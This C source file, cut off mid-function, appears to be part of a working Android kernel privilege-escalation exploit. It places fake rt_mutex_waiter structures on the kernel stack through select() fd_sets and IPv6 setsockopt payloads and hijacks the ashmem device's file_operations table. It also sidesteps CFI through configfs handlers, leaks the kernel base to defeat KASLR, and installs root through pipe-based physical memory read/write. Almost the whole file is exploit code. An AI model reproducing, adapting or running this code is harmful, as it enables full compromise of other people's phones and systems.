#include "common.h"
#include <netinet/in.h>
#include <time.h>
static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}
extern int pselect_custom_write;

#define PSELECT_CFI_ROUTE_ATTEMPTS 8
#define PSELECT_EXPECTED_READY 9

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  /* Let select() establish its stack frame before the PI walk. */
  if (pselect_custom_write == 2) {
    return PSELECT_ENTER_DELAY_USEC;
  }
  if (pselect_custom_write_enabled()) {
    static const int delays[] = {
      50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
    };
    int count = (int)(sizeof(delays) / sizeof(delays[0]));
    return delays[(attempt - 1) % count];
  }
  return -1;
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static int pselect_waiter_shift(void) {
  return active_offsets ? active_offsets->pselect_waiter_shift
                        : PSELECT_WAITER_WORD_SHIFT;
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = pselect_waiter_shift() + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  (void)write_fd;

  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = pselect_words_per_set();
  struct pselect_waiter_word {
    size_t off;
    uint64_t value;
    const char *name;
  } words[] = {
    {0x00, 0, "tree_pc"},
    {0x08, 0, "tree_right"},
    {0x10, 0, "tree_left"},
    {FAKE_WAITER_TREE_PRIO_OFF, 1, "tree_prio"},
    {FAKE_WAITER_TREE_DEADLINE_OFF, 0, "tree_deadline"},
    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 0, "pi_parent"},
    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0, "pi_right"},
    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, 0, "pi_left"},
    {FAKE_WAITER_PI_TREE_PRIO_OFF, 1, "pi_prio"},
    {FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0, "pi_deadline"},
    {FAKE_WAITER_TASK_OFF,
     pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
     "task"},
    {FAKE_WAITER_LOCK_OFF, fake_lock, "lock"},
    {FAKE_WAITER_WAKE_STATE_OFF, 3, "wake_state"},
  };
  /* 5.15 packs wake_state (u32) and the shared prio (u32) into one qword;
   * the wake_state entry must stay last so its combined value wins. */
  if (FAKE_WAITER_WAKE_STATE_OFF + 4 == FAKE_WAITER_PI_TREE_PRIO_OFF &&
      (FAKE_WAITER_PI_TREE_PRIO_OFF & 7) == 4) {
    words[sizeof(words) / sizeof(words[0]) - 1].value =
      ((uint64_t)1 << 32) | 3;
  }
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct pselect_waiter_word *w = &words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, (int)(w->off / 8) + 2,
        w->value, w->name);
  }
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
      block_fd = pipefd[0];
    }
    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    pr_info("pselect route setup attempt=%d simple=%d shift=%d page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
            route_attempt,
            0, pselect_waiter_shift(),
            page_base, fake_lock, fake_w0, fake_task,
            (unsigned long long)fdset_get_word(&in, 0),
            (unsigned long long)fdset_get_word(&in, 3),
            (unsigned long long)fdset_get_word(&out, 0),
            (unsigned long long)fdset_get_word(&ex, 0),
            (unsigned long long)fdset_get_word(&ex, 1),
            (unsigned long long)fdset_get_word(&ex, 2),
            (unsigned long long)fdset_get_word(&ex, 3));
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    struct timeval timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
      .tv_usec = PSELECT_TIMEOUT_USEC,
#else
      .tv_usec = 0,
#endif
    };

    pr_info("pselect pre-select +%.0fms\n", fops_elapsed_ms(&route_t0));
    errno = 0;
    int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
    int saved_errno = errno;
    pr_info("pselect post-select +%.0fms ret=%d\n", fops_elapsed_ms(&route_t0), ret);
    atomic_store(&punch_consume_go, 0);

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d "
            "delay=%d sched=%d/%d futex=%d/%d locked=%d entered=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec,
            atomic_load(&consumer_sched_ret), atomic_load(&consumer_sched_errno),
            atomic_load(&consumer_futex_ret), atomic_load(&consumer_futex_errno),
            atomic_load(&consumer_futex_locked),
            atomic_load(&consumer_futex_entered));

    int route_quality_miss = 0;
    int route_signal = calls > 0 && success > 0;
    int cfi_probed = 0;
    if (route_signal) {
      cfi_probed = 1;
      if (ret != PSELECT_EXPECTED_READY) {
        pr_info("pselect route probing cfi attempt=%d ret=%d expected=%d\n",
                route_attempt, ret, PSELECT_EXPECTED_READY);
      }
      if (pselect_custom_write_enabled()) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    }
    if (!route_verified && route_signal) {
      route_quality_miss = 1;
      if (!cfi_probed) {
        cfi_last_step = 35;
        cfi_last_errno = saved_errno;
      }
      pr_info("pselect route quality miss attempt=%d/%d ret=%d expected=%d delay=%d; refreshing FOPS page\n",
              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, ret,
              PSELECT_EXPECTED_READY, delay_usec);
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_quality_miss) {
      continue;
    }
    if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
      break;
    }
    pr_info("pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d "
          "sched=%d/%d futex=%d/%d locked=%d entered=%d\n",
          calls, success, cfi_last_step, cfi_last_errno,
          atomic_load(&consumer_sched_ret), atomic_load(&consumer_sched_errno),
          atomic_load(&consumer_futex_ret), atomic_load(&consumer_futex_errno),
          atomic_load(&consumer_futex_locked),
          atomic_load(&consumer_futex_entered));
}

static int mcast_payload_off(void) {
  return active_offsets ? (int)active_offsets->mcast_payload_off : 0;
}

/* Some vendor contexts (e.g. HyperOS apps without the INTERNET permission,
 * or hardened seccomp arg filters) return EPERM for specific family/type/
 * protocol combinations. Walk a flavor list, keep the first IPv6 socket that
 * opens, and log every miss so a blanket socket() ban is easy to tell apart
 * from a family-specific one. */
static int mcast_open_socket(void) {
  struct mcast_sock_flavor {
    int family;
    int type;
    int proto;
    const char *name;
  } flavors[] = {
    {AF_INET6, SOCK_DGRAM, 0, "AF_INET6/SOCK_DGRAM/0"},
    {AF_INET6, SOCK_DGRAM, IPPROTO_UDP, "AF_INET6/SOCK_DGRAM/UDP"},
    {AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0, "AF_INET6/SOCK_DGRAM|CLOEXEC/0"},
    {AF_INET6, SOCK_STREAM, 0, "AF_INET6/SOCK_STREAM/0"},
    {AF_INET6, SOCK_STREAM, IPPROTO_TCP, "AF_INET6/SOCK_STREAM/TCP"},
    {AF_INET6, SOCK_RAW, IPPROTO_ICMPV6, "AF_INET6/SOCK_RAW/ICMPV6"},
  };
  int last_errno = EPERM;
  for (size_t i = 0; i < sizeof(flavors) / sizeof(flavors[0]); i++) {
    int fd = socket(flavors[i].family, flavors[i].type, flavors[i].proto);
    if (fd >= 0) {
      pr_info("mcast socket ok via %s fd=%d\n", flavors[i].name, fd);
      return fd;
    }
    last_errno = errno;
    pr_info("mcast socket miss %s errno=%d (%s)\n",
            flavors[i].name, errno, strerror(errno));
  }
  int probe4 = socket(AF_INET, SOCK_DGRAM, 0);
  if (probe4 >= 0) {
    pr_info("mcast probe: AF_INET/SOCK_DGRAM ok, IPv6-specific block\n");
    close(probe4);
  } else {
    pr_info("mcast probe: AF_INET/SOCK_DGRAM errno=%d (%s)\n",
            errno, strerror(errno));
  }
  int probeux = socket(AF_UNIX, SOCK_DGRAM, 0);
  if (probeux >= 0) {
    pr_info("mcast probe: AF_UNIX/SOCK_DGRAM ok, family-specific block\n");
    close(probeux);
  } else {
    pr_info("mcast probe: AF_UNIX/SOCK_DGRAM errno=%d (%s)\n",
            errno, strerror(errno));
  }
  errno = last_errno;
  return -1;
}

void prepare_mcast_payload(unsigned char *payload, size_t len) {
  memset(payload, 0, len);
  size_t base = (size_t)mcast_payload_off();
  if (!base || base + FAKE_WAITER_WW_CTX_OFF + 8 > len) {
    pr_warning("mcast waiter offset %zu does not fit in %zu-byte copy\n",
               base, len);
    return;
  }
  /* Same fake rt_mutex_waiter words as the pselect fd_set route; the mcast
   * route places them inside the 264-byte setsockopt(IPPROTO_IPV6, 46) copy
   * at the derived mcast_payload_off instead of the select fd_set. */
  struct mcast_waiter_word {
    size_t off;
    uint64_t value;
    const char *name;
  } words[] = {
    {0x00, 0, "tree_pc"},
    {0x08, 0, "tree_right"},
    {0x10, 0, "tree_left"},
    {FAKE_WAITER_TREE_PRIO_OFF, 1, "tree_prio"},
    {FAKE_WAITER_TREE_DEADLINE_OFF, 0, "tree_deadline"},
    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 0, "pi_parent"},
    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0, "pi_right"},
    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, 0, "pi_left"},
    {FAKE_WAITER_PI_TREE_PRIO_OFF, 1, "pi_prio"},
    {FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0, "pi_deadline"},
    {FAKE_WAITER_TASK_OFF,
     pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
     "task"},
    {FAKE_WAITER_LOCK_OFF, fake_lock, "lock"},
    {FAKE_WAITER_WAKE_STATE_OFF, 3, "wake_state"},
  };
  /* 5.15 packs wake_state (u32) and the shared prio (u32) into one qword;
   * the wake_state entry must stay last so its combined value wins. */
  if (FAKE_WAITER_WAKE_STATE_OFF + 4 == FAKE_WAITER_PI_TREE_PRIO_OFF &&
      (FAKE_WAITER_PI_TREE_PRIO_OFF & 7) == 4) {
    words[sizeof(words) / sizeof(words[0]) - 1].value =
      ((uint64_t)1 << 32) | 3;
  }
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    size_t qword = words[i].off / 8;
    size_t pos = base + qword * 8;
    if (pos + 8 > len) {
      pr_warning("mcast %s at +0x%zx exceeds payload\n",
                 words[i].name, pos);
      continue;
    }
    memcpy(payload + pos, &words[i].value, sizeof(words[i].value));
  }
}

void do_mcast_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 40;
    cfi_last_errno = 0;
    pr_error("mcast route missing kernel page base=%016zx lock=%016zx "
             "fops=%016zx\n", page_base, fake_lock, fake_fops);
    return;
  }
  int sock = mcast_open_socket();
  if (sock < 0) {
    cfi_last_step = 41;
    cfi_last_errno = errno;
    pr_error("mcast route: no IPv6 socket available (last errno=%d %s)\n",
             errno, strerror(errno));
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 42;
        cfi_last_errno = errno;
        pr_error("mcast retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    unsigned char payload[MCAST_ROUTE_COPY_LEN];
    prepare_mcast_payload(payload, sizeof(payload));
    pr_info("mcast route setup attempt=%d payload_off=0x%x page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx\n",
            route_attempt, mcast_payload_off(),
            page_base, fake_lock, fake_w0, fake_task);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    pr_info("mcast pre-setsockopt +%.0fms\n", fops_elapsed_ms(&route_t0));
    errno = 0;
    int ret = setsockopt(sock, IPPROTO_IPV6, MCAST_ROUTE_OPTNAME,
                         payload, sizeof(payload));
    int saved_errno = errno;
    pr_info("mcast post-setsockopt +%.0fms ret=%d errno=%d\n",
            fops_elapsed_ms(&route_t0), ret, saved_errno);

    /* The 264-byte copy persists on this thread's kernel stack until the
     * next deep syscall, so hold the punch window in userspace (the mirror
     * of select() blocking in the pselect route). clock_gettime is served
     * by the vDSO, so no syscall touches the stack region here. */
    struct timespec window = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
      .tv_nsec = PSELECT_TIMEOUT_USEC * 1000L,
#else
      .tv_nsec = 0,
#endif
    };
    struct timespec until;
    clock_gettime(CLOCK_MONOTONIC, &until);
    until.tv_sec += window.tv_sec;
    until.tv_nsec += window.tv_nsec;
    if (until.tv_nsec >= 1000000000L) {
      until.tv_sec++;
      until.tv_nsec -= 1000000000L;
    }
    for (;;) {
      struct timespec now;
      clock_gettime(CLOCK_MONOTONIC, &now);
      if (now.tv_sec > until.tv_sec ||
          (now.tv_sec == until.tv_sec && now.tv_nsec >= until.tv_nsec)) {
        break;
      }
      __asm__ volatile("yield" ::: "memory");
    }
    atomic_store(&punch_consume_go, 0);

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("mcast window done attempt=%d ret=%d errno=%d calls=%d "
            "success=%d delay=%d sched=%d/%d futex=%d/%d locked=%d entered=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec,
            atomic_load(&consumer_sched_ret), atomic_load(&consumer_sched_errno),
            atomic_load(&consumer_futex_ret), atomic_load(&consumer_futex_errno),
            atomic_load(&consumer_futex_locked),
            atomic_load(&consumer_futex_entered));

    int route_quality_miss = 0;
    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      if (pselect_custom_write_enabled()) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 43;
      }
    }
    if (!route_verified && route_signal) {
      route_quality_miss = 1;
      if (cfi_last_step == 43) {
        cfi_last_step = 35;
      }
      pr_info("mcast route quality miss attempt=%d/%d delay=%d; "
              "refreshing FOPS page\n",
              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, delay_usec);
    } else if (!route_verified) {
      cfi_last_step = 44;
      cfi_last_errno = saved_errno;
    }

    if (route_quality_miss) {
      continue;
    }
    if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
      break;
    }
    pr_info("mcast cfi write miss attempt=%d/%d errno=%d; "
            "refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
  }
  close(sock);
  pr_info("mcast route done calls=%d success=%d step=%d errno=%d "
          "sched=%d/%d futex=%d/%d locked=%d entered=%d\n",
          calls, success, cfi_last_step, cfi_last_errno,
          atomic_load(&consumer_sched_ret), atomic_load(&consumer_sched_errno),
          atomic_load(&consumer_futex_ret), atomic_load(&consumer_futex_errno),
          atomic_load(&consumer_futex_locked),
          atomic_load(&consumer_futex_entered));
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

int install_child_root(int fd) {
  return install_pipe_physrw(fd) && install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    pr_info("cfi open failed path=%s errno=%d\n", ashmem_path, errno);
    return 0;
  }

  pr_info("cfi attempt=%d fd=%d path=%s fake_fops=%016zx target=%016zx "
          "ioctl=%016llx open=%016llx write_iter=%016llx\n",
          cfi_attempts, fd, ashmem_path, fake_fops, binwrite_target,
          (unsigned long long)text_addr(ASHMEM_IOCTL),
          (unsigned long long)text_addr(ASHMEM_OPEN),
          (unsigned long long)text_addr(CONFIGFS_BIN_WRITE_ITER));

  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  pr_info("cfi fops_before ret=%zd value=%016llx want=%016zx errno=%d\n",
          rb, (unsigned long long)before, fake_fops, errno);
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
